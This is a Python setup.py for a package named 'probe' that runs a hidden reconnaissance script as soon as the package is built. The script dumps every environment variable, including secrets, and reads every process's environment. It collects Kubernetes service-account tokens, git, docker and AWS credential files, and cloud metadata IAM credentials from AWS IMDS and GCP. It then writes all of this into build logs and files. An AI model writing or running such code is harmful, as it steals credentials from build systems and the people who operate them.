import os, sys, json, socket, subprocess, ssl, urllib.request, urllib.error, platform, traceback
try:
    from setuptools import setup
except Exception:
    from distutils.core import setup

SECT = []
def sec(t):
    SECT.append("\n#### %s ####" % t)
def p(*a):
    SECT.append(' '.join(str(x) for x in a))

def sh(cmd, t=20):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout.decode('utf-8','replace') + r.stderr.decode('utf-8','replace'))[:8000]
    except Exception as e:
        return 'ERR ' + repr(e)

def rf(path, n=8000):
    try:
        with open(path,'rb') as f:
            return f.read(n).decode('utf-8','replace')
    except Exception as e:
        return 'ERR ' + repr(e)

def http(url, method='GET', headers=None, data=None, timeout=6, direct=False):
    try:
        if direct:
            op = urllib.request.build_opener(urllib.request.ProxyHandler({}), urllib.request.HTTPSHandler(context=ssl._create_unverified_context()))
            r = op.open(urllib.request.Request(url, headers=headers or {}, data=data, method=method), timeout=timeout)
        else:
            r = urllib.request.urlopen(urllib.request.Request(url, headers=headers or {}, data=data, method=method), timeout=timeout, context=ssl._create_unverified_context())
        return 'HTTP %s %s\n%s' % (r.status, getattr(r,'reason',''), r.read(3000).decode('utf-8','replace'))
    except urllib.error.HTTPError as e:
        try:
            body = e.read(2000).decode('utf-8','replace')
        except Exception:
            body = ''
        return 'HTTPERR %s\n%s\n%s' % (e.code, dict(e.headers), body)
    except Exception as e:
        return 'ERR ' + repr(e)

sec('WHOAMI')
p('uid/gid', os.getuid(), os.getgid(), 'cwd', os.getcwd())
p(sh('id; hostname; uname -a; cat /etc/os-release 2>&1'))
sec('ENV')
for k in sorted(os.environ):
    v = os.environ[k]
    if any(x in k.upper() for x in ('AWS','TOKEN','SECRET','KEY','PASS','CRED','GIT','CHOREO','ARGO','AMP','ECR','DOCKER','REGISTRY')):
        p(k, '=', v)
p('--- full env keys ---', ','.join(sorted(os.environ.keys())))
p('--- full env ---')
for k in sorted(os.environ):
    p(k, '=', os.environ[k][:200])
sec('PROC')
p('proc1cmd', rf('/proc/1/cmdline'))
p('proc1env', rf('/proc/1/environ').replace('\x00','\n'))
p('selfcgroup', rf('/proc/self/cgroup'))
p('mounts', rf('/proc/self/mountinfo', 20000))
try:
    pids = os.listdir('/proc')
    for pid in pids:
        if pid.isdigit():
            e = rf('/proc/%s/environ' % pid, 2000).replace('\x00','\n')
            if e and 'ERR' not in e[:4]:
                p('== pid', pid, 'cmdline:', rf('/proc/%s/cmdline' % pid, 500).replace('\x00',' '))
                p(e)
except Exception as e:
    p('procscan ERR', repr(e))
sec('FILESYSTEM')
p(sh('ls -la / /workspace /layers /platform /home /home/cnb /root /var/run /var/run/secrets /var/run/secrets/kubernetes.io/serviceaccount /etc /etc/secrets /run /run/secrets /mnt /mnt/vol /tmp 2>&1'))
p(sh("find / -maxdepth 4 \\( -iname '*dockerconfig*' -o -name 'auth.json' -o -name '.git-credentials' -o -iname '*secret*' -o -name '*.token' -o -name 'credentials' -o -name '.netrc' -o -name '.gitconfig' \\) 2>/dev/null | head -100"))
for f in ['/var/run/secrets/kubernetes.io/serviceaccount/token','/var/run/secrets/kubernetes.io/serviceaccount/namespace','/root/.gitconfig','/root/.git-credentials','/root/.netrc','/root/.docker/config.json','/root/.aws/credentials','/root/.aws/config','/home/cnb/.gitconfig','/home/cnb/.git-credentials','/home/cnb/.netrc','/home/cnb/.docker/config.json','/etc/containers/auth.json','/run/containers/0/auth.json','/var/run/containers/0/auth.json','/workspace/.git/config','/workspace/.git-credentials']:
    p('--', f, ':', rf(f, 4000))
sec('DNS')
for h in ['kubernetes.default.svc','kube-dns.kube-system.svc','agent-manager-service.platform.svc','registry.workflows.svc','metadata.google.internal','instance-data','541673202425.dkr.ecr.us-east-2.amazonaws.com','github.com','example.com']:
    try:
        p(h, '->', socket.getaddrinfo(h, None)[:2])
    except Exception as e:
        p(h, 'ERR', repr(e))
sec('TCP')
for hp in [('10.172.48.1',443),('10.172.48.1',80),('169.254.169.254',80),('169.254.170.2',80)]:
    try:
        s = socket.create_connection(hp, timeout=4); s.close(); p(hp, 'OPEN')
    except Exception as e:
        p(hp, 'ERR', repr(e))
sec('IMDS')
p('v1-direct', http('http://169.254.169.254/latest/meta-data/', direct=True))
p('v1-ecs', http('http://169.254.170.2/v2/credentials/', direct=True))
it = http('http://169.254.169.254/latest/api/token', method='PUT', headers={'X-aws-ec2-metadata-token-ttl-seconds':'21600'}, direct=True)
p('v2-token', it)
tok = ''
try:
    if it.startswith('HTTP 200'):
        tok = it.split('\n',1)[1].strip()
except Exception:
    pass
if tok:
    hdr={'X-aws-ec2-metadata-token': tok}
    p('v2-root', http('http://169.254.169.254/latest/meta-data/', headers=hdr, direct=True))
    rl = http('http://169.254.169.254/latest/meta-data/iam/security-credentials/', headers=hdr, direct=True)
    p('v2-rolelist', rl)
    role=''
    if rl.startswith('HTTP 200'):
        role = rl.split('\n',1)[1].strip().split('\n')[0].strip()
    if role:
        p('v2-creds', http('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role, headers=hdr, direct=True))
    p('v2-identity', http('http://169.254.169.254/latest/dynamic/instance-identity/document', headers=hdr, direct=True))
    p('v2-userdata', http('http://169.254.169.254/latest/user-data', headers=hdr, direct=True))
p('gcp', http('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor':'Google'}, direct=True))
p('k8s-anon', http('https://10.172.48.1/version', direct=True))
p('k8s-svc', http('https://kubernetes.default.svc/version', direct=True))
sec('ECR')
p('ecr-v2', http('https://541673202425.dkr.ecr.us-east-2.amazonaws.com/v2/', direct=True))
p('ecr-tags', http('https://541673202425.dkr.ecr.us-east-2.amazonaws.com/v2/poc2-1795110817433-image/tags/list', direct=True))
p('dockerhub', http('https://registry-1.docker.io/v2/', direct=True))
sec('EGRESS')
p('https-example', http('https://example.com/', direct=True))
p('github', http('https://github.com/', direct=True))
p('wget-ip', sh('wget -qO- -T 4 http://169.254.169.254/latest/meta-data/ 2>&1 | head -5'))

TXT = '\n'.join(SECT)
for path in ['/workspace/recon_build.txt','/tmp/recon_build.txt', os.path.join(os.getcwd(),'recon_build.txt')]:
    try:
        with open(path,'w') as f: f.write(TXT)
    except Exception as e:
        pass
try:
    sys.stdout.write('\n=====BUILD RECON START=====\n' + TXT[:60000] + '\n=====BUILD RECON END=====\n')
    sys.stdout.flush()
except Exception:
    pass

setup(name='probe', version='0.0.1', py_modules=[])
